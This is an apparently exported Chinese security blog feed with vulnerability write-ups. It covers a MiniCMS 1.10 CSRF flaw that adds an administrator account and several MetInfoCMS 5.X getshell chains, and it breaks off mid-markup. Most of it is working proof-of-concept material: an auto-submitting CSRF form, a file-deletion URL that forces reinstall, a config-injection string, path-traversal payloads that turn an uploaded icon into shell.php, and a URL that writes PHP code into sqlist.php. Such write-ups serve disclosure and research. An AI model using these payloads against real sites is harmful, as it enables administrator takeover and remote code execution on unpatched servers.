      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/MiniCMS/MiniCMS%201.10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/MiniCMS/MiniCMS%201.10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="MiniCMS-1-10存在CSRF漏洞可增加管理员账户"><a href="#MiniCMS-1-10存在CSRF漏洞可增加管理员账户" class="headerlink" title="MiniCMS 1.10存在CSRF漏洞可增加管理员账户"></a>MiniCMS 1.10存在CSRF漏洞可增加管理员账户</h1><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th></th><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td></td><td>MiniCMS 1.10存在CSRF漏洞可增加管理员账户</td><td>2018-03-30</td><td>zixian（<a href="mailto:me@zixian.org" target="_blank" rel="noopener">me@zixian.org</a>、<a href="mailto:zixian@5ecurity.cn" target="_blank" rel="noopener">zixian@5ecurity.cn</a>）</td><td><a href="https://github.com/bg5sbk/MiniCMS" target="_blank" rel="noopener">https://github.com/bg5sbk/MiniCMS</a></td><td><a href="https://github.com/bg5sbk/MiniCMS" target="_blank" rel="noopener">https://github.com/bg5sbk/MiniCMS</a></td><td>1.10</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9092" target="_blank" rel="noopener">CVE-2018-9092</a></td><td></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>MiniCMS 1.10存在CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可增加管理员账户。MiniCMS是一个在github上开源的CMS系统，漏洞发现者已经将漏洞信息通过<a href="https://github.com/bg5sbk/MiniCMS/issues/14" target="_blank" rel="noopener">issues</a>告知作者。  </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>CSRF测试页面代码如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=GB2312"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/minicms/mc-admin/conf.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"site_name"</span> <span class="attr">value</span>=<span class="string">"hack123"</span> /&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"site_desc"</span> <span class="attr">value</span>=<span class="string">"hacktest"</span> /&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"site_link"</span> <span class="attr">value</span>=<span class="string">"http://127.0.0.1/minicms"</span> /&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_nick"</span> <span class="attr">value</span>=<span class="string">"hack"</span> /&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_name"</span> <span class="attr">value</span>=<span class="string">"admin"</span> /&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_pass"</span> <span class="attr">value</span>=<span class="string">"hackpass"</span> /&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"comment_code"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"save"</span> <span class="attr">value</span>=<span class="string">" "</span> /&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">  document.forms[0].submit();</span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>MetInfoCMS 5.X版本GETSHELL漏洞合集  </p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>2018年1月底MetInfoCMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。</p><h2 id="0x01安装过程过滤不严导致Getshell"><a href="#0x01安装过程过滤不严导致Getshell" class="headerlink" title="0x01安装过程过滤不严导致Getshell"></a>0x01安装过程过滤不严导致Getshell</h2><p><em>前提:有删除/config/install.lock权限</em></p><blockquote><p>默认安装的时候设置了权限的@chmod(‘../config/install.lock’,0554);，所以需要在权限修改了的情况下才能利用这个</p></blockquote><h3 id="1-结合网上爆出的后台任意文件删除漏洞"><a href="#1-结合网上爆出的后台任意文件删除漏洞" class="headerlink" title="1. 结合网上爆出的后台任意文件删除漏洞"></a>1. 结合网上爆出的后台任意文件删除漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/admin/app/batch/csvup.php</span></span><br><span class="line"></span><br><span class="line">$classflie=explode(<span class="string">'_'</span>,$fileField);</span><br><span class="line">$classflie=explode(<span class="string">'-'</span>,$classflie[count($classflie)<span class="number">-1</span>]);</span><br><span class="line">$class1=$classflie[<span class="number">0</span>];</span><br><span class="line">$class2=$classflie[<span class="number">1</span>];</span><br><span class="line">$class3=$classflie[<span class="number">2</span>];</span><br><span class="line">$class=$class3?$class3:($class2?$class2:$class1); </span><br><span class="line">$classcsv=$db-&gt;get_one(<span class="string">"select * from $met_column where id=$class"</span>);</span><br><span class="line"><span class="keyword">if</span>(!$classcsv)&#123;</span><br><span class="line">metsave(<span class="string">"../app/batch/contentup.php?anyid=$anyid&amp;lang=$lang"</span>,$lang_csvnocolumn,$depth);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 省略代码</span></span><br><span class="line"></span><br><span class="line">@file_unlink($flienamecsv);</span><br></pre></td></tr></table></figure><p>删除/config/install.lock文件可以导致重装（需要由对应的删除权限），删除文件的poc如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/admin/app/batch/csvup.php?fileField=1_1231-1&amp;flienamecsv=../../../config/install.lock</span><br></pre></td></tr></table></figure><h3 id="2-重装时数据库配置文件过滤不当"><a href="#2-重装时数据库配置文件过滤不当" class="headerlink" title="2. 重装时数据库配置文件过滤不当"></a>2. 重装时数据库配置文件过滤不当</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/install/index.php</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'db_setup'</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($setup==<span class="number">1</span>)&#123;</span><br><span class="line">            $db_prefix      = trim($db_prefix);</span><br><span class="line">            $db_host        = trim($db_host);</span><br><span class="line">            $db_username    = trim($db_username);</span><br><span class="line">            $db_pass        = trim($db_pass);</span><br><span class="line">            $db_name        = trim($db_name);</span><br><span class="line">            $config=<span class="string">"&lt;?php</span></span><br><span class="line"><span class="string">                   /*</span></span><br><span class="line"><span class="string">                   con_db_host = \"$db_host\"</span></span><br><span class="line"><span class="string">                   con_db_id   = \"$db_username\"</span></span><br><span class="line"><span class="string">                   con_db_pass    = \"$db_pass\"</span></span><br><span class="line"><span class="string">                   con_db_name = \"$db_name\"</span></span><br><span class="line"><span class="string">                   tablepre    =  \"$db_prefix\"</span></span><br><span class="line"><span class="string">                   db_charset  =  \"utf8\";</span></span><br><span class="line"><span class="string">                  */</span></span><br><span class="line"><span class="string">                  ?&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            $fp=fopen(<span class="string">"../config/config_db.php"</span>,<span class="string">'w+'</span>);</span><br><span class="line">            fputs($fp,$config);</span><br><span class="line">            fclose($fp);</span><br></pre></td></tr></table></figure><p>在数据库配置时$db_host,$db_username,$db_pass,$db_name,$db_prefix参数可控。</p><h3 id="3-POC"><a href="#3-POC" class="headerlink" title="3. POC"></a>3. POC</h3><p>数据库配置时修改任意参数为<code>*/phpinfo();/*</code>可导致Getshell。点击保存之后，直接访问/config/config_db.php即可getshell。<br>shell地址:<code>http://xxx.com/config/config_db.php</code></p><h2 id="0x02-CVE-2017-11347补丁绕过继续Getshell"><a href="#0x02-CVE-2017-11347补丁绕过继续Getshell" class="headerlink" title="0x02 CVE-2017-11347补丁绕过继续Getshell"></a>0x02 CVE-2017-11347补丁绕过继续Getshell</h2><p><em>前提：windows服务器+网站绝对路径（只需要知道网站index.php所在目录的上一级目录名）</em></p><h3 id="1-查找绝对路径的方法："><a href="#1-查找绝对路径的方法：" class="headerlink" title="1. 查找绝对路径的方法："></a>1. 查找绝对路径的方法：</h3><ul><li><p>利用安装目录下的phpinfo文件： <code>/install/phpinfo.php</code></p></li><li><p>利用报错信息(</p><p>信息在HTML注释中，必须通过查看网页源码的方式才能获取内容，否则看上去是空白页</p><p>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/app/system/include/public/ui/admin/top.php</span><br><span class="line">/app/system/include/public/ui/admin/box.php</span><br><span class="line">/app/system/include/public/ui/web/sidebar.php</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2. 漏洞分析"></a>2. 漏洞分析</h3><p>5.3.19版本针对CVE-2017-11347的补丁分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">switch($val[2])&#123;</span><br><span class="line">   case 1:</span><br><span class="line">      $address=&quot;../about/$fileaddr[1]&quot;;</span><br><span class="line">   break;</span><br><span class="line">   case 2:</span><br><span class="line">      $address=&quot;../news/$fileaddr[1]&quot;;</span><br><span class="line">   break;</span><br><span class="line">   case 3:</span><br><span class="line">      $address=&quot;../product/$fileaddr[1]&quot;;</span><br><span class="line">   break;</span><br><span class="line">   case 4:</span><br><span class="line">      $address=&quot;../download/$fileaddr[1]&quot;;</span><br><span class="line">   break;</span><br><span class="line">   case 5:</span><br><span class="line">      $address=&quot;../img/$fileaddr[1]&quot;;</span><br><span class="line">   break;</span><br><span class="line">   case 8:</span><br><span class="line">      $address=&quot;../feedback/$fileaddr[1]&quot;;</span><br><span class="line">   break;</span><br><span class="line">   default:</span><br><span class="line">      $address = &quot;&quot;;</span><br><span class="line">   break;</span><br><span class="line"></span><br><span class="line">&#125;   </span><br><span class="line">   $newfile  =&quot;../../../$val[1]&quot;; </span><br><span class="line">   if($address != &apos;&apos;)&#123;</span><br><span class="line">      Copyfile($address,$newfile);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即：5.3.19版本采取：即使在$var[2]为空时，默认给address变量赋值为空，并且会判断address参数不为空才调用Copyfile。但是当$var[2]不为空时，由于fileaddr[1]可控导致，仍然可以控制文件路径从而Getshell。</p><p>漏洞利用(网站安装在服务器根路径的情况)：</p><p>第一步，新建1.ico文件，内容为：&lt;?php phpinfo();?&gt;<br>在后台”地址栏图标”处上传该文件。<br>得到地址为：<a href="http://localhost/upload/file/1506587082.ico" target="_blank" rel="noopener">http://localhost/upload/file/1506587082.ico</a></p><p>第二步，发送如下payload(注意左斜杠和右斜杠不能随意更改):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..\upload\file\1506587082.ico/..\..\..\www\about\shell.php|1</span><br></pre></td></tr></table></figure><p>shell的地址为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/about/shell.php</span><br></pre></td></tr></table></figure><h3 id="3-POC-注意左斜杠和右斜杠不能随意更改-："><a href="#3-POC-注意左斜杠和右斜杠不能随意更改-：" class="headerlink" title="3. POC(注意左斜杠和右斜杠不能随意更改)："></a>3. POC(注意左斜杠和右斜杠不能随意更改)：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..\上传ico文件的相对路径/..\..\..\网站index.php路径的上一层目录名\about\webshell的文件名|1</span><br></pre></td></tr></table></figure><p>特别注意其中的：“网站index.php上层目录名”，</p><p>1.如果网站安装在服务器根目录，这wamp/phpstudy默认目录值为“www”；网站index.php上层目录名设置为”www”; 如果为lamp环境，这默认目录值为“html”网站index.php上层目录名设置为”html”;。其他的环境类推（利用绝对路径泄露）。</p><p>2.如果网站安装在服务器的二级目录下，则网站index.php上层目录名设置为二级目录名。</p><p>例如:网站搭建在:<a href="http://localhost/MetInfoCMS" target="_blank" rel="noopener">http://localhost/MetInfoCMS</a> /,则第二步的payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/MetInfoCMS/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..\upload\file\1506588072.ico/..\MetInfoCMS.\MetInfoCMS \about\shell.php|1</span><br></pre></td></tr></table></figure><p>相应生成的shell地址为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/MetInfoCMS/about/shell.php</span><br></pre></td></tr></table></figure><h2 id="0x03-Copyindx函数处理不当Getshell"><a href="#0x03-Copyindx函数处理不当Getshell" class="headerlink" title="0x03 Copyindx函数处理不当Getshell"></a>0x03 Copyindx函数处理不当Getshell</h2><h3 id="1-声明"><a href="#1-声明" class="headerlink" title="1. 声明"></a>1. 声明</h3><p>此漏洞点位于admin/app/physical/physical.php文件，漏洞和CVE-2017-11347漏洞十分相似，但是存在根本的差异，不同点如下：</p><p>（1）触发函数是Copyindex函数，而非Copyfile</p><p>（2）此漏洞不是利用文件包含require_one，而是利用任意内容写入</p><p>（3）此漏洞Getshell不需要上传图片</p><p>（4）结合CSRF可以实现一键Getshell</p><h3 id="2-漏洞点"><a href="#2-漏洞点" class="headerlink" title="2. 漏洞点"></a>2. 漏洞点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># admin/app/physical/physical.php:197-236</span><br><span class="line"></span><br><span class="line">switch($op)&#123;</span><br><span class="line">   case 1:</span><br><span class="line">   if(is_dir(&apos;../../../&apos;.$val[1]))&#123;</span><br><span class="line">      deldir(&apos;../../../&apos;.$val[1]);</span><br><span class="line">      echo $lang_physicaldelok;</span><br><span class="line">   &#125;</span><br><span class="line">   else&#123;unlink(&apos;../../../&apos;.$val[1]);</span><br><span class="line">      echo $lang_physicaldelok;</span><br><span class="line">      &#125;</span><br><span class="line">   break;</span><br><span class="line">   case 2:</span><br><span class="line">      $adminfile=$url_array[count($url_array)-2];</span><br><span class="line">      $strsvalto=readmin($val[1],$adminfile,1);</span><br><span class="line">      filetest(&apos;../../../&apos;.$val[1]);</span><br><span class="line">      deldir(&apos;../../../&apos;.$val[1]);</span><br><span class="line">      $dlappfile=parse_ini_file(&apos;dlappfile.php&apos;,true);</span><br><span class="line">      if($dlappfile[$strsvalto][&apos;dlfile&apos;])&#123;</span><br><span class="line">         $return=varcodeb(&apos;app&apos;);</span><br><span class="line">         $checksum=$return[&apos;md5&apos;];</span><br><span class="line">         $met_file=&apos;/dl/app_curl.php&apos;;</span><br><span class="line">         $stringfile=dlfile($dlappfile[$strsvalto][&apos;dlfile&apos;],&quot;../../../$val[1]&quot;);</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">         $met_file=&apos;/dl/olupdate_curl.php&apos;;</span><br><span class="line">         $stringfile=dlfile(&quot;v$metcms_v/$strsvalto&quot;,&quot;../../../$val[1]&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      if($stringfile==1)&#123;</span><br><span class="line">         echo $lang_physicalupdatesuc;</span><br><span class="line">      &#125;</span><br><span class="line">      else&#123;</span><br><span class="line">         echo dlerror($stringfile);</span><br><span class="line">         die();</span><br><span class="line">      &#125;</span><br><span class="line">   break;</span><br><span class="line">   case 3:</span><br><span class="line">      $fileaddr=explode(&apos;/&apos;,$val[1]);</span><br><span class="line">      $filedir=&quot;../../../&quot;.$fileaddr[0];  </span><br><span class="line">      if(!file_exists($filedir))&#123; @mkdir ($filedir, 0777); &#125; </span><br><span class="line">      if($fileaddr[1]==&quot;index.php&quot;)&#123;</span><br><span class="line">         Copyindx(&quot;../../../&quot;.$val[1],$val[2]);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>当$action等于op而且$op等于3的时候，如果$filedir不存在则创建$filedir目录，而且如果$fileaddr[1]等于”index.php”则调用Copyindex函数，并传入$val[1]和$val[2]参数，此处两个参数来自变量$valphy,均可控！！跟进Copyindex函数源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#admin/include/global.func.php:877-884</span><br><span class="line"></span><br><span class="line">function Copyindx($newindx,$type)&#123;</span><br><span class="line">   if(!file_exists($newindx))&#123;</span><br><span class="line">      $oldcont =&quot;&lt;?php\n# xxx Enterprise Content Management System \n# Copyright (C) xxx Co.,Ltd (http://www.xxx.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once &apos;../include/module.php&apos;; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) xxx Co., Ltd. (http://www.xxx.cn). All rights reserved.\n?&gt;&quot;;</span><br><span class="line">      $fp = fopen($newindx,w);</span><br><span class="line">      fputs($fp, $oldcont);</span><br><span class="line">      fclose($fp);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，直接把参数$type直接赋值给$fmodule,并写入文件内容，所以可以构造payload直接getshell.</p><h3 id="3-POC-xxx为任意的shell目录，index-php文件名不能修改"><a href="#3-POC-xxx为任意的shell目录，index-php文件名不能修改" class="headerlink" title="3. POC(xxx为任意的shell目录，index.php文件名不能修改)"></a>3. POC(xxx为任意的shell目录，index.php文件名不能修改)</h3><p>生成的shell地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/MetInfoCMS/xxx/index.php</span><br></pre></td></tr></table></figure><h2 id="0x04-olupdate文件缺陷导致Getshell"><a href="#0x04-olupdate文件缺陷导致Getshell" class="headerlink" title="0x04 olupdate文件缺陷导致Getshell"></a>0x04 olupdate文件缺陷导致Getshell</h2><h3 id="1-漏洞点"><a href="#1-漏洞点" class="headerlink" title="1. 漏洞点"></a>1. 漏洞点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#/admin/system/olupdate.phpwen文件中，当$action=sql,$sql!=No Date且$sqlfile不是数组时进入如下过程</span><br><span class="line"></span><br><span class="line">#326-360行</span><br><span class="line">$num=1;</span><br><span class="line">$random = met_rand(6);</span><br><span class="line">$date=date(&apos;Ymd&apos;,time());</span><br><span class="line">require_once &apos;../system/database/global.func.php&apos;;</span><br><span class="line">do&#123;</span><br><span class="line">    $sqldump = &apos;&apos;;</span><br><span class="line">    $startrow = &apos;&apos;;</span><br><span class="line">    $tables=tableprearray($tablepre);</span><br><span class="line">    $sizelimit=2048;</span><br><span class="line">    $tableid = isset($tableid) ? $tableid - 1 : 0;</span><br><span class="line">    $startfrom = isset($startfrom) ? intval($startfrom) : 0;</span><br><span class="line">    $tablenumber = count($tables);</span><br><span class="line">    for($i = $tableid; $i &lt; $tablenumber &amp;&amp; strlen($sqldump) &lt; $sizelimit * 1000; $i++)&#123;</span><br><span class="line">        $sqldump .= sql_dumptable($tables[$i], $startfrom, strlen($sqldump));</span><br><span class="line">        $startfrom = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    $startfrom = $startrow;</span><br><span class="line">    $tableid = $i;</span><br><span class="line">    if(trim($sqldump))&#123;</span><br><span class="line">        $sqlfile[]=$bakfile = &quot;../update/$addr/&#123;$con_db_name&#125;_&#123;$date&#125;_&#123;$random&#125;_&#123;$num&#125;.sql&quot;;</span><br><span class="line">        $version=&apos;version:&apos;.$metcms_v;</span><br><span class="line">        $sqldump = &quot;#xxx.cn Created &#123;$version&#125; \n#&#123;$met_weburl&#125;\n#&#123;$tablepre&#125;\n#&#123;$met_webkeys&#125;\n# --------------------------------------------------------\n\n\n&quot;.$sqldump;</span><br><span class="line">        if(!file_put_contents($bakfile, $sqldump))&#123;</span><br><span class="line">            dl_error($lang_updaterr2.&quot;(&#123;$adminfile&#125;/update/$addr/&#123;$con_db_name&#125;_&#123;$date&#125;_&#123;$random&#125;_&#123;$num&#125;.sql)&quot;,$type,$olid,$ver,$addr,$action);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $num++;</span><br><span class="line">&#125;</span><br><span class="line">while(trim($sqldump));</span><br><span class="line">if(is_array($sqlfile)) $string = &quot;&lt;?php\n \$sqlfile = &quot;.var_export($sqlfile, true).&quot;; ?&gt;&quot;;</span><br><span class="line">filetest(&quot;../update/$addr/sqlist.php&quot;);</span><br><span class="line">if(!file_put_contents(&quot;../update/$addr/sqlist.php&quot;,$string))&#123;</span><br><span class="line">    dl_error($lang_updaterr2.&quot;(&#123;$adminfile&#125;/update/$addr/sqlist.php)&quot;,$type,$olid,$ver,$addr,$action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时由于sqlfile不是数组，即is_array($sqlfile)不成立，导致$string没有初始化，可以任意修改，接着调用file_put_contents将string的值写到/update/$addr/sqlist.php文件。</p><p><em>PS:这里有一个小点,由于输入控制sqlfile不是数组，第345行执行$sqlfile[]=$bakfile = “../update/$addr/{$con_dbname}{$date}{$random}{$num}.sql”;会导致给字符串赋值报错，导致无法执行到后面的Getshell部分。所以需要构造payload使得trim($sqldump)为空，即$sqldump值为空，从而跳过$sqlfile[]赋值部分，这里构造tableid=1000(其实只要&gt;=44即可)</em></p><p>最后的payload结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/system/olupdate.php?action=sql&amp;sqlfile=1&amp;string=shell内容&amp;addr=shell的目录&amp;tableid=1000</span><br></pre></td></tr></table></figure><h3 id="2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控"><a href="#2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控" class="headerlink" title="2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)"></a>2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/admin/system/olupdate.php?action=sql&amp;sqlfile=1&amp;string=&lt;?php phpinfo();?&gt;&amp;addr=12313&amp;tableid=1000</span><br></pre></td></tr></table></figure><p>执行后的shell地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 